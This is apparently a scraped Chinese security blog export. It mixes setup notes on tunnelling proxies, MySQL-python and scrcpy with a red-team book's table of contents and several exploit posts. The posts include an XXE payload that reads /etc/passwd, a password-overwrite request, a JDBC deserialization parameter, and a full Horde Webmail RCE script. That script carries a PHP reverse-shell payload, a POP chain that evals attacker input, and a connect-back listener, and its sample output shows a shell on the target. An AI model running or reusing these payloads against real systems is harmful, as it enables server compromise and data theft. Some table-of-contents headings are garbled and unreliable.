.\\Invoke-SocksProxy.psm1Invoke-SocksProxy -bindPort 1234 效果: 这里用同网段的另一个win7，使用Proxifer去使用靶机的1234端口进行socks代理 增加线程(默认是200,增加到400,默认端口1080)： 123Import-Module .\\Invoke-SocksProxy.psm1Invoke-SocksProxy -threads 400 nps nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。 背景 做微信公众号开发、小程序开发等—-&gt; 域名代理模式 想在外网通过ssh连接内网的机器，做云服务器到内网服务器端口的映射，—-&gt; tcp代理模式 在非内网环境下使用内网dns，或者需要通过udp访问内网机器等—-&gt; udp代理模式 在外网使用HTTP代理访问内网站点—-&gt; http代理模式 搭建一个内网穿透ss，在外网如同使用内网vpn一样访问内网资源或者设备—-&gt; socks5代理模式 特点 协议支持全面，兼容几乎所有常用协议，例如tcp、udp、http(s)、socks5、p2p、http代理… 全平台兼容(linux、windows、macos、群辉等)，支持一键安装为系统服务 控制全面，同时支持服务端和客户端控制 https集成，支持将后端代理和web服务转成https，同时支持多证书 操作简单，只需简单的配置即可在web ui上完成其余操作 展示信息全面，流量、系统信息、即时带宽、客户端版本等 扩展功能强大，该有的都有了（缓存、压缩、加密、流量限制、带宽限制、端口复用等等） 域名解析具备自定义header、404页面配置、host修改、站点保护、URL路由、泛解析等功能 服务端支持多用户和用户注册功能 安装releases 服务端启动下载完服务器压缩包后，解压，然后进入解压后的文件夹 执行安装命令 对于linux|darwin sudo ./nps install 对于windows，管理员身份运行cmd，进入安装目录 nps.exe install 默认端口 nps默认配置文件使用了80，443，8080，8024端口 80与443端口为域名解析模式默认端口 8080为web管理访问端口 8024为网桥端口，用于客户端与服务器通信 启动 对于linux|darwin sudo nps start 对于windows，管理员身份运行cmd，进入程序目录 nps.exe start 1安装后windows配置文件位于 C:\\Program Files\\nps，linux和darwin位于/etc/nps 如果发现没有启动成功，可以查看日志(Windows日志文件位于当前运行目录下，linux和darwin位于/var/log/nps.log) 访问服务端ip:web服务端口（默认为8080） 使用用户名和密码登陆（默认admin/123，正式使用一定要更改） 创建客户端 客户端连接 点击web管理中客户端前的+号，复制启动命令 执行启动命令，linux直接执行即可，windows将./npc换成npc.exe用cmd执行 配置 客户端连接后，在web中配置对应穿透服务即可 更多用法以及详细教程https://ehang-io.github.io/nps/#/","link":"/2020/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/"},{"title":"安恒信息 渗透攻击红队百科全书","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306第一章 信息搜集1.1 主机发现1.2 关联信息生成1.3 开放漏洞情报1.4 开源情报信息搜集(OSINT)1.5 Github Hacking1.6 Google Hacking1.7 Gitlcret1.8 Mailsniper.psl获取Outlook所有联系人1.9 内网渗透之信息收集1.10 后渗透信息收集之Wmic命令的一些使用方法1.ll 内网横向常见端口第二章 打点内网2.1 外部接入点2.1.1 无线攻击实战应用之DNSSpoof.Evil Portal.DWall组合拳入侵2.2 应用系统漏洞利用2.2.1 常见漏洞扫描2.2.1.1 Impacket框架之Mssql服务器安全检测2.2.1.2 MS17_010 py脚本利用2.2.2 未授权访问漏洞2.2.2.1 未授权漏洞总结2.2.2.2 JBOSS未授权访问2.2.3 远程代码执行漏洞2.2.3.1 Java下奇怪的命令执行2.2.3.2 Shiro反序列化记录2.2.3.3 RMI列化2.2.3.4 JNDI注入2.2.3.5 Fastjson 漏洞浅析2.2.3.6 CVE19043 PHP 远程代码执行复现2,2.3.7 Java WebsheIl从入门到入狱系列1基础篇2.2.3.8 深究XMl.decoder2.2:3.9 Fast.Json度序列化学习2.2.3.10 Oracle数据库安全思考之Xml反序列化2.2.3.11 Webshe11绕安全模式执行命令2.2.3.I2 Java 下的XXE漏洞2.2.3.13 Solr Velocity 模板远程代码复现及利用指南2.2.3.14 SolrEaloeitymplate2.2.3.15 Java Webshell从入门到入狱系列2对抗之Bypass上篇2.2:3.16 Java Webshel1 从入门到入狱系列3对抗之Bypass2.2.3.17 Java Webshell 从入门到入球系列4对抗之Bypass一下篇2.2.3.18 Java'反序列化过程深究2.2.3.19 Apache Solr不安全配置远程代码执行漏润复现及Jmx Rml利用分析2.2.3.20 Java命令执行小细节2.2.3.21 JDK反序列化Gadgets212.2.3.22 WeblogicE1990alysis2.23.23 Spring Boottuators未授权漏淘2.2.3.24 SEMCMS2.6后台文件上传漏洞审计2.2.3.25 代码审计之Lvyecms后台Getshell2.2.3.26 Log4jserializealysis2.2.3.27 Java反序列化stJson 组件2.2.3.28 Springcuriyuth2(CVE1860)2.2.4 WAFpass2:2.5 登陆口JS前端加密绕过2.2.6 Xmldecoder标签2.2.7 利用 Php My Admin去Get Shell2.2.8 攻击JMT的一些方式2.2.9 上传漏洞 2.2.9.1 上传漏洞2.2.10 注入漏洞2.2.10.1 注入漏洞2.2.10.2 MSSQL利用总结2.2.10.3 攻击MSSQL—werUpSQL介绍2.2.10.4 如何利用Mysql安全特性发现漏洞2.2.10.5 Hibernate基本注入2.2.10.6 My Sql利用General_Log_File.Slow_Query_Log_File 写文件2.2.10.7 【会战分享】SQL Server注入Getshell2.2.11 文件读取漏洞2.2.12 Pentesterlab Xss2.2.13 Office宏的基本利用2.2.14 Javacuritylendar19ndyne2.2.15 Discuz Ssrf Rce漏洞分析报告2.2.16 WordPress语言文件代码执行漏洞分析报告2.2.17 Struts2远程命令执行S28 漏洞分析报告2.2.18 静态免杀Php一句话(已过D盾，河马，安全狗）2.2.19 金融信息系统安全测评方法2.2.20 ApacheiE一Analysis2.2.21 记一次阿里主站Xss测试及绕过WAF防护2.2.22 ClassLoader类加载机制2.2.23 浅谈SSRF原理及其利用2.2.24 Springtammons (CVE1873) 2.2.25 Xss绕过代码后端长度限制的方法2.2.26 Mysql提权之MOF2.2.27 Mysql提权之UDF2.2.28 Xss基础学习2.2.29 Java反射与内存Shell初探Jetty容器的Shell维权2.2.30 利用DNSLOG回显2.2.31 文件合成/图片马生成2.2.32 UDF 提权2.4 社会工程学2.4.1 水坑攻击2.4.2 鱼叉攻击 2.4.2.1 Swaks邮件伪造2.4.2.2 邮件伪造防御技术2.4.3 钓鱼攻击 2.4.3.1 视觉效果 2.4.3.1.1 凭证劫持漏洞2.4.3.2 克隆技术2.4.3.3 Word文档云宏代码钓鱼2.2.5 APP密码算法通用分析方法2.2.6 Linux下反弹shell命令2.2.7 Browser Pivot for Chrome第三章 命令与控制3.1 HTTP隧道ABPTTS第一季3.2 HTTP隧道reGeorg第二季 3.3 HTTP隧道Tunna第三季3.4 HTTP隧道reDuh第四季3.5 基于Ptunnel建立ICMP隧道3.6 使用anydesk做远控3.7 防御域内委派攻击3.8 ATT&amp;CK攻防初窥系列执行篇3.9 Powershell3.9.1 利用36O正则不严执行powershell上线3.9.2 关于Powershell对抗安全软件3.9.3 InvokeObfuscation介绍第四章 穿透与转发4.1 Frp内网穿透实战4.2 基于Portfwd端口转发4.3 Venom代理转发、多级穿透4.4 DNS隧道4.4.1 DNS隧道之DNS 2 TCP4.4.2 DNS隧道之DNSCAT 24.4.3 使用DNS协议上线MSF 之Iodine篇4.4.4 使用DNS协议上线MSF 之DNSCAT2篇4.4.5 使用DNS协议上线MSF之 DNS 2 TCP篇第五章 内部信息搜集5.1 本地信息搜集 5.1.1 用普通权限的域帐户获得域环境中所有DNS解析记录5.1.2 凭证及令牌票据5.1.3.1 内存转储获取本地HASH5.1.4.2 转储域账户哈希值5.1.5.3 转储域账户哈希值(续)5.1.6.4 SPN发现与利用5.1.7.5 哈希传递远程登录篇5.1.3 用户习惯5.1.3.1 从目标文件中做信息搜集第一季5.1.4 获取当前系统所有用户的谷歌浏览器密码5.1.5 Windows2003获取密码之Adsutil.wbs5.1.6 解密目标机器保存的rdp 凭证5.1.7 HASHcat破解HASH 神器详解5.1.8 解密SecureCRT客户端中保存的密码HASH5.1.9 解密Winscp客户端中保存的密码HASH5.1.10 破解Weblogic配置文件中的数据库密码5.1.11 获取域控/系统日志.5.2 网络信息搜集5.2.1 发现目标Web程序敏感目录第一季5.2.2 基于SCF做目标内网信息搜集第二季5.2.3 域环境信息搜集5.2.3.1 Active Directory Domain Services获取域控信息5.2.3.2 Windows域渗透―用户密码枚举5.2.3.3 不同环境下域DNS记录信息收集方法 5.2.3.4 Impacket框架之域信息获取 5.2.3.5 域信息收集之user2sid，sid2user5.2.4 工作组环境信息搜集5.2.4.1 基于MSF发现内网存活主机第一季5.2.4.2 基于MSF发现内网存活主机第二季5.2.4.3 基于MSF发现内网存活主机第三季5.2.4.4 基于MSF发现内网存活主机第四季5.2.4.5 基于MSF发现内网存活主机第五季5.2.4.6 基于MSF发现内网存活主机第六季5.2.4.7 基于SqlDataSourceEnumerator发现内网存活主机5.2.4.8 基于ICMP发现内网存活主机.5.2.4.9 基于UDP发现内网存活主机·5.2.4.10 基于ARP发现内网存活主机5.2.4.11 基于Snmp发现内网存活主机5.2.4.12 基于Netbios发现内网存活主机5.2.5 Powershell一条命令行进行内网扫描.5.2.6 内网信息收集之内网代理第六章 权限提升6.1 操作系统提权·6.1.1 Linux 6.1.1.1 Linux提权依赖exp篇（第二课）6.1.1.2 Sudo 漏洞分析（CVE201914287)6.1.1.3 linux提权(一)之内核提权·6.1.2 Windows6.1.2.1 Windows提权快速查找EXP（第一课）·6.1.2.2 Token窃取与利用 6.1.2.3 CVE20191388 Windows UAC第七章 权限维持7.1 操作系统后门 7.1.1 Linux 7.1.2 Windows 7.1.2.1 对抗权限长期把控伪造无效签名第一季7.1.2.2 常见Windows持久控制总结7.1.2.3 Windows RID 劫持.7.1.2.4 Shfit映像劫持后门新玩法7.1.2.5 Windows权限维持篇注册表维权–.7.1.2.6 Windows权限维持篇2计划任务维权·7.1.2.7 Windows权限维持篇3服务Service维权7.2 第三方组件后门.7.3 APT对抗〔一）红蓝对抗关于后门对抗7.4 APT对抗二）红蓝对抗关于后门对抗7.5 APT对抗（三）红蓝对抗关于后门对抗7.6 APT对抗（四）红蓝对抗关于后门对抗·7.7 DLL劫持两种劫持方法剖析7.8 APT对抗（五）红蓝对抗关于后门对抗·7.9 APT对抗（六）红蓝对抗关于后门对抗·7.10 APT对抗（七）红蓝对抗关于后门对抗.7.11 ATT&amp;CK攻防初窥系列横向移动篇·7.12 Linux权限维持之LD_PRELOAD 7.13 Linux权限维持之进程注入7.14 Windows权限维持之Office启动第八章 内网渗透基础8.1 Kerberos协议 8.1.1 Windows认证原理之Kerberos篇8.2 NTLM 8.2.1 NTLM协议及HASH 抓取8.2.2 Windows 认证原理之NTLM篇8.3 内网命令行渗透笔记.8.4 内网渗透中的文件传输第一季8.5 Msfvenom常用生成Payload命令8.6 Windows环境压缩文件&amp;文件夹命令合集8.7 Windows net命令集使用8.8 CobaltStrike 与Metasploit实战联动8.9 渗透中常用的复制工具第九章 红队自研9.1 免杀方案研发9.1.1 实战免杀诺顿Shellcode载入内存免杀9.1.2 人人都能过杀软9.1.3 远控木马极速免杀360五引擎 9.1.4 基于Ruby内存加载Shellcode第一季9.1.5 DLL加载Shellcode 免杀上线9.1.6 借助Aspx对Payload进行分离免杀·9.1.7 静态恶意代码逃逸(第一课)9.1.8 静态恶意代码逃逸(第二课).9.1.9 静态恶意代码逃逸∈第三课) 9.1.10 静态恶意代码逃逸（第四课）9.1.11 静态恶意代码逃逸（第五课）9.1.12 基于Python内存加载Shellcode第二季9.1.13 Payload分离免杀思路– 9.1.14 基于实战中的Small Payload应用——第一季9.1.15 基于实战中的Small Payload应用——第二季.9.1.16 基于Go内存加载Shellcode第三季.9.1.17 免杀技术之msf偏执模式9.1.18 免杀技术之生成Shellcode自行编译·9.1.19 免杀技术之代码加密·9.1.20 免杀技术之使用c实现Meterpreter功能9.1.21 白加黑免杀过360开机启动拦截·9.1.22 使用C#实现简单的分离兔杀第十章 安全工具教学10.1 Impacket套件之远程命令执行功能讲解.10.2 Bloodhound 技术讲解10.3 Windows 10配置搭建Kali环境第一季.10.4 与CrackMapExec结合攻击 10.5 Meterpreter下的Irb操作第一季10.6 基于第十课补充Payload(—)10.7 基于第十课补充 Payload(二) 10.8 域信息收集之普通域用户权限获取域里详细信息ldifde工具10.9 域信息收集csvde工具10.10 xSS 之Beef神器―.10.11 Pstools讲解(远程执行命令&amp;登录日志导出等)10.12 Netcat使用总结10.13 五分钟快速编写漏洞EXP 第十一章 红队技巧11.1 基于白名单Msbuild.exe执行Payload第一季11.2 基于白名单Installutil.exe执行Payload第二季11.3 基于白名单regasm.exe执行Payload第三季 11.4 基于白名单regsvcs.exe执行Payload第四季11.5 基于白名单Mshta.exe执行Payload第五季11.6 基于白名单Compiler.exe执行Payload第六季l1.7 基于白名单Csc.exe执行Payload第七季11.8 基于白名单Msiexec执行Payload第八季11.9 基于白名单Regsvr32执行Payload第九季11.10 基于白名单Wmic执行Payload第十季11.11 基于白名单RunDLL32.exe执行Payload第十一季l1.12 基于白名单Odbcconf执行Payload第十二季·11.13 基于白名单PsExec执行Payload第十三季.11.14 基于白名单Forfiles执行Payload第十四季11.15 基于白名单Pcalua执行Payload第十五季11.16 基于白名单Cmstp.exe执行Payload第十六季·11.17 基于白名单Ur1.DLL执行Payload第十七季11.18 基于白名单zipfldr.DLL执行Payload第十八季11.19 基于白名单msiexec执行Payload补充11.20 基于白名单Ftp.exe执行Payload第十九季―.11.21 网络安全学习方法论之体系的重要性第十二章 工具优化及分享12.1 解决Msfvenom命令自动补全12.2 工具介绍thebackdoorfactory（第九课）12.3 工具介绍VeilEvasion(第十一课）12.4 离线CyberChef使用指南·第十三章 案例分享13.1 某次项目技术点实录Regsvr32 ole对象·13.2 阿里云Access Token问题–项目收获记录13.3 从打点到域控的练习 13.4 安防软件 Bypass13.5 Docker常用命令与Docker逃逸漏洞复现13.6 渗透沉思录 13.7 项目回忆:体系的本质是知识点串联13.9 漏洞修复系列之Oracle远程数据投毒漏洞修复(非RAC环境)13.10 记一次Ueditor老版本的非常规Getshell 13.11 云安全共测大赛初赛Game App题目解析13.12 三层靶机搭建及其内网渗透（附靶场环境）13.13 记一次简单的漏洞利用与横向.13.14 翻译文章 13.14.1 CVE201912757:Symantec Endpoint Protection中的本地特权升级13.14.2 攻击SQLServer CLR程序集 13.14.3 AMTHoneypot蜜罐指南（翻译）13.14.4 Honeypotcamera蜜罐指南(翻译）13.14.5 (译文)Cobalt Strike使用混淆绕过WindowsDefender13.15 渗透实战从打点到域控的全过程13.16 Docker极速入门 13.17 记一次应急响应样本分析第十四章 运营14.1 如何将金字塔原理在运营中应用14.2 活动心得——如何举办一场沙龙活动 14.3 从用户中来，到用户中去14.4 文章与活动之间的关联","link":"/2020/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%AE%89%E6%81%92%E4%BF%A1%E6%81%AF-%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/"},{"title":"Mac os 安装Mysql-Python","text":"Mac os 安装Mysql-python安装环境情况 安装命令1pip install MySql-python 通常这样是行不通的 安装前的准备123456789101112130. brew install mysql1. brew unlink mysql # 如果已经安装2. brew install mysql-connector-c # 安装mysql依赖文件3. which mysql_config # 查看本地mysql_config 文件在哪4. vim mysql_config 找到 libs=&quot;$libs -l&quot; 替换为 lib=&quot;$libs -lmysqlclient -lssl -lcrypto&quot; # 新版mysql可能已经替换5. pip install mysqlclinet6. pip install MySql-python7. brew unlink mysql-connector-c8. brew link mysql 遇见错误12345_mysql.c:36:10: fatal error: 'my_config.h' file not found#include &quot;my_config.h&quot; ^~~~~~~~~~~~~1 error generated.error: command 'cc' failed with exit status 1 错误原因1. 未安装mysql-connector-c 缺少对应库2. 安装了新版的mysql默认没有my_config文件 **这是mysql 8.0.19默认库文件，确实没有my_config.h，这个时候我们需要copy一份 将mysql.h copy 一份重命名为 my_config.h 然后在进行安装即可 1pip install MySql-python 参考stackoverflow，原文：stackoverflow","link":"/2020/08/01/%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83/Mac-os-%E5%AE%89%E8%A3%85Mysql-Python/"},{"title":"scrcpy使用","text":"scrcpy使用 简单地来说，scrcpy就是通过adb调试的方式来将手机屏幕投到电脑上，并可以通过电脑控制您的Android设备。它可以通过USB连接，也可以通过Wifi连接（类似于隔空投屏），而且不需要任何root权限，不需要在手机里安装任何程序。scrcpy同时适用于GNU / Linux，Windows和macOS。 它的一些特性： 亮度（原生，仅显示设备屏幕） 性能（30~60fps） 质量（1920×1080或以上） 低延迟（35~70ms） 启动时间短（显示第一张图像约1秒） 非侵入性（设备上没有安装任何东西） 此项目为开源项目，Github地址：Genymobile/scrcpy: Display and control your Android device 使用scrcpy的要求 Android设备至少需要API 21（Android 5.0以上版本）; 确保在您的设备上启用了adb调试; 在某些设备上，您还需要启用其他选项以使用键盘和鼠标控制它。 使用USB进行连接此方式推荐使用，相对更加流畅。 手机通过USB连接到PC上，首次连接会弹出是否信任该电脑，点击始终信任即可。 运行adb usb查看是否连接成功 使用无线连接可参考官方文档：Open Source Project - Scrcpy now works wirelessly 此连接方式更加方便快捷，若宽带速率高，使用效果更佳，使用方法也非常简单。 确保PC和手机在同一Wifi中 手机先通过USB与PC相连 在PC上运行 adb tcpip 服务端口，如端口为5555 拔下你的设备，断开USB连接 在PC上运行 adb connect 手机IP:服务端口（手机IP可通过手机的状态信息查看，或者登录路由器查看，一般以192.168开头） 运行scrcpy，在cmd中输入scrcpy.exe","link":"/2020/08/04/%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83/scrcpy%E4%BD%BF%E7%94%A8/"},{"title":"Apache Cocoon XML注入 (CVE-2020-11991)","text":"程序使用了StreamGenerator这个方法时,解析从外部请求的xml数据包未做相关的限制,恶意用户就可以构造任意的xml表达式,使服务器解析达到XML注入的安全问题。 1、漏洞利用条件有限必须是apacheCocoon且使用了StreamGenerator,也就是说只要传输的数据被解析就可以实现了。 123456&lt;!--?xml version=&quot;1.0&quot; ?--&gt;&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&lt;userInfo&gt; &lt;firstName&gt;John&lt;/firstName&gt; &lt;lastName&gt;&amp;ent;&lt;/lastName&gt;&lt;/userInfo&gt; 参考链接：http://mail-archives.apache.org/mod_mbox/cocoon-users/202009.mbox/author","link":"/2020/09/14/WEB/Exploit/Apache-Cocoon-XML%E6%B3%A8%E5%85%A5-CVE-2020-11991/"},{"title":"Apache DolphinScheduler权限覆盖漏洞(CVE-2020-13922)","text":"漏洞描述发现的漏洞是任何租户下的普通用户都可以通过以下方式覆盖其他用户的密码api interface /dolphinscheduler/users/update 受影响的版本受影响版本Apache DolphinScheduler = 1.2.0、1.2.1、1.3.1 安全版本Apache DolphinScheduler &gt;= 1.3.2 12POST /dolphinscheduler/users/updateuserName=admin&amp;userPassword=Password1!&amp;tenantId=1&amp;email=sdluser%40sdluser.sdluser&amp;phone=&amp;id=1 漏洞修复方案建议用户将 Apache DolphinScheduler 升级到安全版本。 下载链接：https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html","link":"/2020/09/17/WEB/Exploit/Apache-DolphinScheduler%E6%9D%83%E9%99%90%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-CVE-2020-13922/"},{"title":"Apache DolphinScheduler远程代码执行(CVE-2020-11974)","text":"Apache DolphinScheduler组件介绍​ Apache DolphinScheduler(incubator,原EasyScheduler）是一个分布式工作流任务调度系统，主要解决数据研发ETL错综复杂的依赖关系，不能直观监控任务健康状态。DolphinScheduler以DAG流式的方式将Task组装起来，可实时监控任务的运行状态，同时支持重试、从指定节点恢复失败、暂停及Kill任务等操作。 漏洞描述​ CVE-2020-11974与mysql connectorj远程执行代码漏洞有关，在选择mysql作为数据库时，攻击者可通过jdbc connect参数输入{“detectCustomCollations”:true，“autoDeserialize”:true} 在DolphinScheduler 服务器上远程执行代码。 影响版本受影响版本Apache DolphinScheduler = 1.2.0、1.2.1 安全版本Apache DolphinScheduler &gt;= 1.3.1 漏洞利用需要登陆权限 该漏洞存在于数据源中心未限制添加的jdbc连接参数,从而实现JDBC客户端反序列化。 1、登录到面板 -&gt; 数据源中心。 2、jdbc连接参数就是主角,这里没有限制任意类型的连接串参数。 3、将以下数据添加到jdbc连接参数中,就可以直接触发。 12345POST /dolphinscheduler/datasources/connect HTTP/1.1type=MYSQL&amp;name=test&amp;note=&amp;host=127.0.0.1&amp;port=3306&amp;database=test&amp;principal=&amp;userName=root&amp;password=root&amp;connectType=&amp;other={&quot;detectCustomCollations&quot;:true,&quot;autoDeserialize&quot;:true} 关于MySQL JDBC客户端反序列化漏洞的相关参考： https://www.anquanke.com/post/id/203086","link":"/2020/09/17/WEB/Exploit/Apache-DolphinScheduler%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2020-11974/"},{"title":"Horde Groupware Webmail Edition 远程命令执行","text":"Python Exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207#!/usr/bin/env python3&quot;&quot;&quot;Horde Groupware Webmail Edition Sort sortpref Deserialization of Untrusted Data Remote Code Execution VulnerabilityIdentifiers: ZDI-CAN-10436 / ZDI-20-1051Found by ..: mr_meTested on .: Horde Groupware Webmail 5.2.22 (pear installation) on Debian 9 Stretch w/ Apache/2.4.25 &amp; PHP 7.0.33Summary:========It's possible to reach a deserialization of untrusted data vulnerability within the constructor of the IMP_Prefs_Sort class. A low privileged authenticated attacker can leverage this to achieve remote code execution.Example:========saturn:~ mr_me$ ./poc.py (+) usage ./poc.py &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;(+) eg: ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337saturn:~ mr_me$ ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337(+) targeting http://172.16.175.145/horde/(+) obtained session iefankvohbl8og0mtaadm3efb6(+) inserted our php object(+) triggering deserialization...(+) starting handler on port 1337(+) connection from 172.16.175.145(+) pop thy shell!iduid=33(www-data) gid=33(www-data) groups=33(www-data)pwd/var/www/horde/servicesuname -aLinux target 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 GNU/Linuxexit*** Connection closed by remote host ***(+) repaired the target!&quot;&quot;&quot;import reimport sysimport socketimport requestsimport telnetlibimport base64from threading import Threaddef rs(cbh, cbp): return &quot;&quot;&quot;@error_reporting(-1);@set_time_limit(0); @ignore_user_abort(1);$dis=@ini_get('disable_functions');if(!empty($dis)){ $dis=preg_replace('/[, ]+/', ',', $dis); $dis=explode(',', $dis); $dis=array_map('trim', $dis);}else{ $dis=array();}$ipaddr='%s';$port=%d;function PtdSlhY($c){ global $dis; if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) { $c=$c.&quot; 2&gt;&amp;1\\\\n&quot;; } ob_start(); system($c); $o=ob_get_contents(); ob_end_clean(); if (strlen($o) === 0){ $o = &quot;NULL&quot;; } return $o;}$nofuncs='no exec functions';$s=@fsockopen(&quot;tcp://$ipaddr&quot;,$port);while($c=fread($s,2048)){ $out = ''; if(substr($c,0,3) == 'cd '){ chdir(substr($c,3,-1)); }else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') { break; }else{ $out=PtdSlhY(substr($c,0,-1)); if($out===false){ fwrite($s, $nofuncs); break; } } fwrite($s,$out);}fclose($s);&quot;&quot;&quot; % (cbh, cbp)def get_session(t, p, usr, pwd): uri = &quot;http://%s%slogin.php&quot; % (t, p) p = { &quot;login_post&quot; : 1337, &quot;horde_user&quot; : usr, &quot;horde_pass&quot; : pwd } r = requests.post(uri, data=p, allow_redirects=False) match = re.findall(&quot;Horde=(.{26});&quot;, r.headers['set-cookie']) assert len(match) == 2, &quot;(-) failed to login&quot; return match[1]def trigger_deserialization(t, p, s, host, port): &quot;&quot;&quot; Object instantiation to reach the deserialization &quot;&quot;&quot; handlerthr = Thread(target=handler, args=(port,)) handlerthr.start() uri = &quot;http://%s%sservices/ajax.php/imp/imple&quot; % (t, p) p = { &quot;imple&quot; : &quot;IMP_Prefs_Sort&quot;, &quot;app&quot; : &quot;imp&quot;, } h = { &quot;cmd&quot; : base64.b64encode(rs(host, port).encode()) } c = { &quot;Horde&quot; : s } r = requests.get(uri, params=p, cookies=c, headers=h) match = re.search(&quot;horde_logout_token=(.*)&amp;&quot;, r.text) assert match, &quot;(-) failed to leak the horde_logout_token!&quot; p['token'] = match.group(1) r = requests.get(uri, params=p, cookies=c, headers=h) assert r.status_code == 200, &quot;(-) failed to trigger deserialization!&quot;def get_pop(): &quot;&quot;&quot; An updated pop chain &quot;&quot;&quot; pop = 'O:34:&quot;Horde_Kolab_Server_Decorator_Clean&quot;:2:{' pop += 'S:43:&quot;\\\\00Horde_Kolab_Server_Decorator_Clean\\\\00_server&quot;;O:20:&quot;Horde_Prefs_Identity&quot;:3:{' pop += 'S:9:&quot;\\\\00*\\\\00_prefs&quot;;O:11:&quot;Horde_Prefs&quot;:2:{' pop += 'S:8:&quot;\\\\00*\\\\00_opts&quot;;a:1:{' pop += 's:12:&quot;sizecallback&quot;;a:2:{i:0;O:12:&quot;Horde_Config&quot;:1:{' pop += 'S:13:&quot;\\\\00*\\\\00_oldConfig&quot;;s:44:&quot;eval(base64_decode($_SERVER[HTTP_CMD]));die;&quot;;' pop += '}i:1;s:13:&quot;readXMLConfig&quot;;}}' pop += 'S:10:&quot;\\\\00*\\\\00_scopes&quot;;a:1:{' pop += 's:5:&quot;horde&quot;;C:17:&quot;Horde_Prefs_Scope&quot;:10:{[null,[1]]}}}' # implements Serializable using custom unserialize/serialize pop += 'S:13:&quot;\\\\00*\\\\00_prefnames&quot;;a:1:{s:10:&quot;identities&quot;;i:0;}' pop += 'S:14:&quot;\\\\00*\\\\00_identities&quot;;a:1:{i:0;i:0;}}' # additional checks pop += 'S:42:&quot;\\\\00Horde_Kolab_Server_Decorator_Clean\\\\00_added&quot;;a:1:{i:0;i:0;}}' return popdef get_patch(): &quot;&quot;&quot; Our original array &quot;&quot;&quot; patch = 'a:1:{' patch += 's:5:&quot;INBOX&quot;;a:1:{' patch += 's:1:&quot;b&quot;;i:6;' patch += '}}' return patchdef set_pref(t, p, s, k, o): &quot;&quot;&quot; A primitive that inserts a string into the database &quot;&quot;&quot; uri = &quot;http://%s%sservices/ajax.php/imp/setPrefValue&quot; % (t, p) p = { &quot;pref&quot; : k, &quot;value&quot; : o, } c = { &quot;Horde&quot; : s } r = requests.get(uri, params=p, cookies=c) match = re.search(&quot;horde_logout_token=(.*)&amp;&quot;, r.text) assert match, &quot;(-) failed to leak the horde_logout_token!&quot; p['token'] = match.group(1) r = requests.get(uri, params=p, cookies=c) assert (&quot;\\&quot;response\\&quot;:true&quot; in r.text and r.status_code == 200), &quot;(-) failed to set the preference!&quot;def handler(lport): print(&quot;(+) starting handler on port %d&quot; % lport) t = telnetlib.Telnet() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((&quot;0.0.0.0&quot;, lport)) s.listen(1) conn, addr = s.accept() print(&quot;(+) connection from %s&quot; % addr[0]) t.sock = conn print(&quot;(+) pop thy shell!&quot;) t.interact()def fix_path(p): if p == &quot;/&quot;: return p if not p.startswith(&quot;/&quot;): p = &quot;/%s&quot; % p if not p.endswith(&quot;/&quot;): p = &quot;%s/&quot; % p return pdef main(): if len(sys.argv) &lt; 5: print(&quot;(+) usage %s &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;&quot; % sys.argv[0]) print(&quot;(+) eg: %s 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337&quot; % sys.argv[0]) sys.exit(0) target = sys.argv[1] path = fix_path(sys.argv[2]) user = sys.argv[3].split(&quot;:&quot;)[0] pswd = sys.argv[3].split(&quot;:&quot;)[1] host = sys.argv[4].split(&quot;:&quot;)[0] port = int(sys.argv[4].split(&quot;:&quot;)[1]) print(&quot;(+) targeting http://%s%s&quot; % (target, path)) session = get_session(target, path, user, pswd) print(&quot;(+) obtained session %s&quot; % session) set_pref(target, path, session, 'sortpref', get_pop()) print(&quot;(+) inserted our php object&quot;) print(&quot;(+) triggering deserialization...&quot;) trigger_deserialization(target, path, session, host, port) set_pref(target, path, session, 'sortpref', get_patch()) print(&quot;(+) repaired the target!&quot;)if __name__ == &quot;__main__&quot;: main() 1234567891011121314151617181920212223saturn:~$./poc.py 172.16.175.148/horde/ hordeuser:pass123 172.16.175.145(+) targeting http://172.16.175.145/horde/(+) obtained session iefankvohbl8og0mtaadm3efb6(+) inserted our php object(+) triggering deserialization...(+) starting handler on port 1337(+) connection from 172.16.175.145(+) 